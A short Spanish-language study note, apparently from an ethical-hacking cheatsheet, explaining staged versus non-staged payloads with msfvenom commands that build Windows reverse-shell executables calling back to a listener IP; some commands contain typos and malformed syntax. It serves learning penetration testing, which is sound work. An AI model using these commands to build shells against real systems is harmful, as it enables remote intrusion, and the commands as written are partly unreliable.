---
tags:
  - Conceptos
---
# Payload Staged

**Payload Staged**: Es un tipo de payload que se **divide en dos** **o más etapas**. La primera etapa es una pequeña parte del código que se envía al objetivo, cuyo propósito es establecer una conexión segura entre el atacante y la máquina objetivo. Una vez que se establece la conexión, el atacante envía la segunda etapa del payload, que es la carga útil real del ataque. Este enfoque permite a los atacantes sortear medidas de seguridad adicionales, ya que la carga útil real no se envía hasta que se establece una conexión segura.

## Creación:

Listener con metasploit

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp --platform Windows -a x64 LHOST=192.168.111.45 LPORT:4646 -f exe -o reverse.exe
```

## Payload Non-Staged

**Payload Non-Staged**: Es un tipo de payload que se envía como **una sola entidad** y **no se divide en múltiples etapas**. La carga útil completa se envía al objetivo en un solo paquete y se ejecuta inmediatamente después de ser recibida. Este enfoque es más simple que el Payload Staged, pero también es más fácil de detectar por los sistemas de seguridad, ya que se envía todo el código malicioso de una sola vez.

## Creación:

Listener con metasploit

```bash
msfvenom -p windows/x64/meterprete_reverse_tcp --platform Windows -a x64 LHOST=192.168.111.45 LPORT:4646 -f exe -o shell.exe
```

Listener con netcat:

```bash
msfvenom -p windows/x64/shell_reverse_tcp --platform Windows -a x64 LHOST=192.168.111.45 LPORT:4646 -f exe -o shell.exe
```

https://afsh4ck.gitbook.io/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-hosts/msfvenom

